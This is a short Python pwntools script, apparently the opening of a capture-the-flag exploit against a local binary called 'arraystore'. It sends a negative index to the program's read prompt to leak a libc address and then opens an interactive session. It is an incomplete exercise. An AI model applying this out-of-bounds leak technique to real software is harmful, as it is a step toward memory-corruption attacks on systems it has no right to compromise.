from pwn import *

elf = context.binary = ELF("./arraystore")
libc = elf.libc
r = elf.process()

#gdb.attach(r, '''b*main+153\nb*main+352\nb*main+376\nc''')

def read(num):
    r.sendlineafter(b"Read/Write?:", b"R")
    r.sendlineafter(b"Index:", b"-" + str(num).encode())

########################
#    LEAK LIBC ADDR    #
########################

read(2)

r.interactive()